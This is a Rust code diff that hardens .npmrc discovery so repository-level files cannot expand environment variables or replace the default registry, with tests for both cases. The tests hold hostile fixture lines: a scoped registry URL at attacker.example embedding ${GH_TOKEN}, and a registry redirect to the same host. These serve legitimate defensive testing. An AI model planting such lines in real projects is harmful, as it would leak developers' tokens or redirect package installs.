@@ -53,32 +53,44 @@ pub fn parse(body: &str, env: impl Fn(&str) -> Option<String>) -> NpmrcRoutes {
     routes
 }
 
-/// User file first, then the project's, so the project wins per key.
+/// User routes and project routes, kept apart so the caller can treat them
+/// with different trust. A project file may not expand the environment: a
+/// hostile repository could otherwise put `${GH_TOKEN}` in a URL and have the
+/// token sent to its own host.
+pub fn discover_split(
+    home: Option<&Path>,
+    project: Option<&Path>,
+    env: impl Fn(&str) -> Option<String>,
+) -> (NpmrcRoutes, NpmrcRoutes) {
+    let user = read_file(home.map(|home| home.join(".npmrc")), &env);
+    let mut project_routes =
+        read_file(project.map(|project| project.join(".npmrc")), &|_: &str| {
+            None
+        });
+    // A repository's `registry=` must not replace the public default for every
+    // name; only scope routes survive discovery there.
+    project_routes.default_registry = None;
+    (user, project_routes)
+}
+
+fn read_file(path: Option<PathBuf>, env: &impl Fn(&str) -> Option<String>) -> NpmrcRoutes {
+    path.and_then(|path| std::fs::read_to_string(path).ok())
+        .map(|body| parse(&body, env))
+        .unwrap_or_default()
+}
+
+/// Combined view for tests: the project overrides the user per scope, and the
+/// caller supplies whatever environment expansion is appropriate.
 pub fn discover(
     home: Option<&Path>,
     project: Option<&Path>,
     env: impl Fn(&str) -> Option<String> + Copy,
 ) -> NpmrcRoutes {
-    let mut merged = NpmrcRoutes::default();
-    let mut files: Vec<PathBuf> = Vec::new();
-    if let Some(home) = home {
-        files.push(home.join(".npmrc"));
-    }
-    if let Some(project) = project {
-        files.push(project.join(".npmrc"));
-    }
-    for path in files {
-        let Ok(body) = std::fs::read_to_string(&path) else {
-            continue;
-        };
-        let parsed = parse(&body, env);
-        if parsed.default_registry.is_some() {
-            merged.default_registry = parsed.default_registry;
-        }
-        for (scope, url) in parsed.scopes {
-            merged.scopes.retain(|(existing, _)| *existing != scope);
-            merged.scopes.push((scope, url));
-        }
+    let (user, project) = discover_split(home, project, env);
+    let mut merged = user;
+    for (scope, url) in project.scopes {
+        merged.scopes.retain(|(existing, _)| *existing != scope);
+        merged.scopes.push((scope, url));
     }
     merged
 }
@@ -238,6 +250,38 @@ registry=https://registry.npmjs.org/
             routes.default_registry.as_deref(),
             Some("https://user-default/")
         );
+    }
+
+    #[test]
+    fn a_project_file_may_not_expand_the_environment() {
+        let home = tempfile::tempdir().unwrap();
+        let project = tempfile::tempdir().unwrap();
+        std::fs::write(
+            project.path().join(".npmrc"),
+            "@acme:registry=https://attacker.example/${GH_TOKEN}
+",
+        )
+        .unwrap();
+        let env = |key: &str| (key == "GH_TOKEN").then(|| "secret".to_string());
+        let (_, project_routes) = discover_split(Some(home.path()), Some(project.path()), env);
+        assert!(
+            project_routes.scopes.is_empty(),
+            "a repository file expanded an environment variable: {project_routes:?}"
+        );
+    }
+
+    #[test]
+    fn a_project_default_registry_is_ignored() {
+        let home = tempfile::tempdir().unwrap();
+        let project = tempfile::tempdir().unwrap();
+        std::fs::write(
+            project.path().join(".npmrc"),
+            "registry=https://attacker.example/
+",
+        )
+        .unwrap();
+        let (_, project_routes) = discover_split(Some(home.path()), Some(project.path()), none);
+        assert_eq!(project_routes.default_registry, None);
     }
 
     #[test]
